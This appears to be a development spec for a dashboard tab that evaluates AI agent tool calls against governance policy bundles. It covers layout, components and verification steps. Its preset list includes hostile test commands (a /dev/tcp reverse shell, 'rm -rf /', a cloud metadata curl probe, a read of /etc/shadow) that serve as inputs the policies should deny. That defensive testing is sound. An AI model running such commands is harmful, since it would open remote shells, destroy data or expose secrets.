# P6: Tab 4 — Evaluate ("Will this contract catch what I expect?")

> **Scope:** evaluate-manual, evaluate-replay, evaluate-tab
> **Depends on:** P5 (Diff tab working, evaluate API tested via impact preview)
> **Deliverable:** Manual evaluator + event replay comparison working end-to-end
> **Time budget:** Single session

> **⚠️ MULTI-BUNDLE UPDATE:** `getBundleYaml(name, version)` now takes bundle name as first param.
> The page shell passes `selectedBundle: string` — use it in all `getBundleYaml` calls.
> `BundleWithDeployments` now has a `name: string` field you can use.

---

## Required Reading

1. `contracts_spec.md` §6 (Tab 4: Evaluate), §6.2 (Manual), §6.3 (Replay), §3.10 (test data — governance-v5 presets)
2. `contracts_spec.md` §1.9 (TanStack Table mandate — replay results table)
3. `PROMPT-FRONTEND-AUDIT.md` — Quality gate

## Shared Modules — MUST Import

| Need | Import from |
|------|-------------|
| Verdict colors/icons | `verdictColor`, `VerdictIcon`, `VERDICT_STYLES` from `@/lib/verdict-helpers` |
| Relative timestamps | `formatRelativeTime` from `@/lib/format` |
| Tool args display | `formatToolArgs`, `getArgsPreview` from `@/lib/format` |
| Args preview by tool type | `extractArgsPreview` from `@/lib/payload-helpers` |
| Observe findings | `isObserveFinding` from `@/lib/payload-helpers` |
| Evaluate API | `evaluateBundle` from `@/lib/api` |
| Events API | `listEvents` from `@/lib/api` |
| YAML fetching | `getBundleYaml` from `@/lib/api` |
| Bundle validation | `validateBundle` from `./yaml-parser` |
| TanStack Table | `@tanstack/react-table` |

---

## Files to Create (3 files)

### 1. `pages/contracts/evaluate-manual.tsx`

**Props:** `bundles: BundleWithDeployments[]`

Three-input manual evaluator: pick a contract source, build a tool call, evaluate.

**Layout:**
```
┌ Contract Source ─────────────────────────────── ┐
│ [Use deployed v3 ▾]  or  [Paste custom YAML]   │
└───────────────────────────────────────────────── ┘

┌ Tool Call ───────────────────────────────────── ┐
│ Preset: [Select a preset... ▾]                  │
│ Tool name: [read_file          ]                │
│ Arguments (JSON):                               │
│ ┌──────────────────────────────────────────┐   │
│ │ { "path": "/home/.env" }                 │   │
│ └──────────────────────────────────────────┘   │
│                                                 │
│ Environment: [production ▾]                     │
│ Agent ID:    [test-agent         ]             │
│ ▶ Advanced (Principal)                          │
└───────────────────────────────────────────────── ┘

[Evaluate ▸]

┌ Result ──────────────────────────────────────── ┐
│ DENIED  by block-sensitive-reads (precondition) │
│ Message: Sensitive file '/home/.env' denied.    │
│                                                  │
│ Contracts evaluated: 8                           │
│ ├ ✕ block-sensitive-reads — MATCHED → deny      │
│ ├ ○ block-destructive-bash — not matched         │
│ ...                                              │
│                                                  │
│ Evaluation time: 2ms                            │
└──────────────────────────────────────────────── ┘
```

**Contract source:**

Two modes, toggled by a small button group or `Tabs`:
- **Deployed version:** shadcn `Select` with all versions (default: latest). On select → `getBundleYaml(version)` → store YAML
- **Custom YAML:** Opens inline `Textarea` (monospace). Validate with `validateBundle()` on change.

**Presets:** shadcn `Select` with optgroups:

*Basic:*
- "Read .env file" → tool: `read_file`, args: `{ "path": "/home/.env" }`
- "Destructive bash" → tool: `bash`, args: `{ "command": "rm -rf /" }`
- "Production deploy (developer)" → tool: `deploy_service`, args: `{ "service": "api" }`, env: production, principal: `{ "role": "developer" }`
- "Normal file read" → tool: `read_file`, args: `{ "path": "/workspace/src/main.py" }`

*Advanced (governance-v5):*
- "Shell attack (reverse shell)" → tool: `exec`, args: `{ "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" }`
- "Cloud metadata probe" → tool: `exec`, args: `{ "command": "curl 169.254.169.254/latest/meta-data/" }`
- "File outside sandbox" → tool: `read_file`, args: `{ "path": "/etc/shadow" }`
- "MCP tool call (approval)" → tool: `mcp_slack`, args: `{ "action": "post_message", "channel": "#ops" }`
- "Allowed exec in workspace" → tool: `exec`, args: `{ "command": "git status" }`

Selecting a preset fills in all fields (tool, args, env, principal). User can modify before evaluating.

**Tool call builder:**
- Tool name: shadcn `Input`
- Tool args: shadcn `Textarea` with `className="font-mono"`. Validate JSON on blur — show error below if invalid.
- Environment: shadcn `Select` — "production", "staging", "development"
- Agent ID: shadcn `Input` with default "test-agent"
- Principal: shadcn `Collapsible` labeled "Advanced" — expands to show:
  - user_id: `Input`
  - role: `Input`
  - claims: `Textarea` (JSON)

**Evaluate button:** `Button` with `Loader2` spinner when running.
- Disabled when: no YAML, no tool name, invalid JSON args
- On click: `evaluateBundle({ yaml_content, tool_name, tool_args, environment, agent_id, principal })`

**Result display:**

Large verdict badge at the top:
- DENIED: use `VERDICT_STYLES.denied` + `VerdictIcon({ verdict: "denied" })`
- ALLOWED: use `VERDICT_STYLES.allowed` + `VerdictIcon({ verdict: "allowed" })`
- WOULD_DENY (observe mode): `bg-amber-500/15 text-amber-600 dark:text-amber-400 border-amber-500/30`

Below:
- "by: {deciding_contract} ({type})" — contract that produced the verdict
- Message: the expanded message template, in `font-mono text-sm bg-muted rounded p-2`

Full pipeline trace:
```
Contracts evaluated: 8
├ ✕ block-sensitive-reads — MATCHED → deny
├ ○ block-destructive-bash — not matched
├ ○ prod-deploy-requires-senior — not matched
├ ○ prod-requires-ticket — not matched
├ ○ pii-in-output — not evaluated (pre only)
├ ✓ file-sandbox — MATCHED → allowed (within)
├ ○ exec-sandbox — not matched (wrong tool)
└ ○ session-limits — passed
```

Icons:
- ✕ Matched + deny: `X` icon, `text-red-600 dark:text-red-400`
- ✓ Matched + allow/pass: `Check` icon, `text-emerald-600 dark:text-emerald-400`
- ! Matched + warn: `AlertTriangle` icon, `text-amber-600 dark:text-amber-400`
- ○ Not matched: `Circle` icon, `text-muted-foreground`

Evaluation time: `text-xs text-muted-foreground` — "{N}ms"

**Error state:** Below result area: "Evaluation failed: {message}. [Retry]"

**File size target:** ~150-180 lines. This is the densest manual component. If over 180, extract the result display to `evaluate-result.tsx`.

### 2. `pages/contracts/evaluate-replay.tsx`

**Props:** `bundles: BundleWithDeployments[]`

Event replay comparison: evaluate recent events against two bundle versions, show which verdicts change.

**Layout:**
```
┌ Replay Config ───────────────────────────────── ┐
│ Test bundle: [v5 (latest) ▾]                    │
│ Against:     [Last 50 events ▾]                 │
│ Compare with: [v3 (production) ▾]               │
│                                                  │
│ [Run Replay ▸]                                   │
└───────────────────────────────────────────────── ┘

┌ Results ──── 50 events evaluated ────────────── ┐
│                                                  │
│ 38 unchanged  │  8 new denials  │  4 relaxed    │
│                                                  │
│ ┌ Changed Verdicts (12) ─────────────────────┐  │
│ │ (TanStack Table)                           │  │
│ │ Tool         Agent         Time    Change  │  │
│ │ read_file    deploy-01     2h ago  →denied │  │
│ │ exec         research-bot  3h ago  →denied │  │
│ └────────────────────────────────────────────┘  │
└──────────────────────────────────────────────── ┘
```

**Config section:**
- Test bundle: shadcn `Select` with versions, default latest
- Event source: shadcn `Select` — "Last 50 events" (default), "Last 24h (max 50)". Both use `limit: 50` to cap API calls.
- Compare with: shadcn `Select` with versions, default production-deployed (or second-latest)

**Run Replay button:** `Button` with `Loader2` when running.

**Progress:** While running, show `Progress` bar or text: "Evaluating 23/50..."

**Partial failure handling:** Same pattern as `diff-impact.tsx` (P5):
- Track per-event errors separately
- Show "42/50 evaluated, 8 failed"
- Collapsible section for failed events

**Results summary bar:**
- N unchanged: `text-muted-foreground`
- N new denials: `text-red-600 dark:text-red-400`
- N relaxed: `text-emerald-600 dark:text-emerald-400`
- N failed: `text-amber-600 dark:text-amber-400` (if any)

**Changed verdicts table:** **TanStack Table** (mandated by CLAUDE.md for tabular data).

Columns:
| Column | Content | Width |
|--------|---------|-------|
| Tool | `event.tool_name` | auto |
| Args preview | `extractArgsPreview(event)` | auto, truncated |
| Agent | `event.agent_id` (truncated) | 120px |
| Time | `formatRelativeTime(event.timestamp)` | 80px |
| Old verdict | Badge with `verdictColor(old)` | 80px |
| → | Arrow icon | 24px |
| New verdict | Badge with `verdictColor(new)` | 80px |
| Contract | Deciding contract ID | auto |

**Row expand:** Click row → expands to show full evaluation trace for both versions (old and new). Two columns of pipeline traces side by side.

**File size target:** ~150-180 lines. If over 180, extract the results table to `replay-results-table.tsx`.

### 3. `pages/contracts/evaluate-tab.tsx`

**Props:** `bundles: BundleWithDeployments[]`

Mode toggle + orchestrator. Thin file.

**Layout:**
```
Evaluate                    [Manual │ Replay]

{active mode content}
```

**Mode toggle:** Small `Tabs` at top, two triggers: "Manual", "Replay".

```tsx
<Tabs defaultValue="manual">
  <TabsList>
    <TabsTrigger value="manual">Manual</TabsTrigger>
    <TabsTrigger value="replay">Replay</TabsTrigger>
  </TabsList>
  <TabsContent value="manual">
    <EvaluateManual bundles={bundles} />
  </TabsContent>
  <TabsContent value="replay">
    <EvaluateReplay bundles={bundles} />
  </TabsContent>
</Tabs>
```

**Endpoint not available:** If `evaluateBundle` returns 404 on the first call in either mode, show a full-tab message: "The evaluate endpoint is not deployed yet. Check the server setup guide." This check can be done once on mount with a health-check call, or lazily on first evaluation attempt.

**File size target:** ~40-60 lines

---

## Wire into Page Shell

Update `pages/contracts.tsx`:
- Import `EvaluateTab` from `./contracts/evaluate-tab`
- Replace evaluate tab placeholder with `<EvaluateTab bundles={bundles} />`

---

## Verification

### Manual mode — devops-agent bundle:

- [ ] Select "Use deployed v1" (devops-agent)
- [ ] Select preset "Read .env file" → fields auto-fill
- [ ] Click "Evaluate" → result shows DENIED by block-sensitive-reads
- [ ] Message shows "Sensitive file '/home/.env' denied."
- [ ] Pipeline trace shows 6 contracts, only block-sensitive-reads matched
- [ ] Evaluation time shown

- [ ] Select preset "Normal file read" → evaluate → ALLOWED
- [ ] Select preset "Destructive bash" → evaluate → DENIED by block-destructive-bash

### Manual mode — governance-v5 bundle:

- [ ] Select v2 (governance-v5)
- [ ] Preset "Shell attack (reverse shell)" → DENIED by deny-shells
- [ ] Preset "Cloud metadata probe" → DENIED by deny-exec-metadata
- [ ] Preset "File outside sandbox" → DENIED by file-sandbox
- [ ] Preset "MCP tool call (approval)" → result shows "approve" effect with timeout=120
- [ ] Preset "Allowed exec in workspace" → ALLOWED (passes sandbox checks)

### Manual mode — custom YAML:

- [ ] Switch to "Paste custom YAML" mode
- [ ] Paste invalid YAML → validation error shown
- [ ] Paste valid YAML → validation passes, can evaluate

### Manual mode — observe mode:

- [ ] Evaluate against a YAML bundle with `mode: observe` on a contract
- [ ] Result shows `call_would_deny` verdict (amber badge, not red)

### Replay mode:

- [ ] Select test bundle (v2) and baseline (v1)
- [ ] Select "Last 50 events"
- [ ] Click "Run Replay" → progress bar advances
- [ ] Results show summary: N unchanged, N new denials, N relaxed
- [ ] Changed verdicts table renders with all columns
- [ ] Click a row → expands to show full trace for both versions
- [ ] If no events exist → "No events found in the selected time range"

### Replay — partial failures:

- [ ] If some events fail evaluation → shows "42/50 evaluated, 8 failed"
- [ ] Failed events listed in collapsible section

### Endpoint not available:

- [ ] If evaluate endpoint returns 404 → shows graceful message (not a crash)

### Theme check:

- [ ] Dark mode: verdict badges visible, pipeline trace icons colored correctly
- [ ] Light mode: same — all `text-*-600 dark:text-*-400` pairs correct
- [ ] WOULD_DENY badge (amber) readable in both themes

### TanStack Table:

- [ ] Replay results table uses TanStack Table (not hand-rolled `<table>`)
- [ ] Columns are sortable (at least by tool name and time)
- [ ] Row expansion works

### Audit checklist:

- [ ] All files under 200 lines
- [ ] No raw HTML elements — all shadcn
- [ ] No duplicated utility functions
- [ ] No `any` types
- [ ] Verdict colors use shared `@/lib/verdict-helpers`
- [ ] Loading states on buttons while evaluating
- [ ] Error states inline with retry
- [ ] Presets load all fields correctly
- [ ] JSON validation on tool args textarea

---

## Final Verification: Full Contracts View

After P6, the entire Contracts view should be complete. Do a final pass:

- [ ] All four tabs work: Contracts, Versions, Diff, Evaluate
- [ ] Tab routing via URL params (`?tab=contracts|versions|diff|evaluate`)
- [ ] SSE connected — upload a bundle → toast on all tabs
- [ ] Deploy → env badges update everywhere
- [ ] Cross-tab navigation: Versions "View full diff →" → opens Diff tab pre-populated
- [ ] Cross-tab navigation: Coverage link in contract detail → opens Events feed filtered
- [ ] Dark mode: screenshot all four tabs — no invisible text
- [ ] Light mode: screenshot all four tabs — no washed-out colors
- [ ] `pnpm build` clean
- [ ] `pnpm tsc --noEmit` clean
- [ ] All files under 200 lines
- [ ] Run `PROMPT-FRONTEND-AUDIT.md` full checklist
- [ ] **Demo test:** Would you show this to an investor? If not, what's missing?
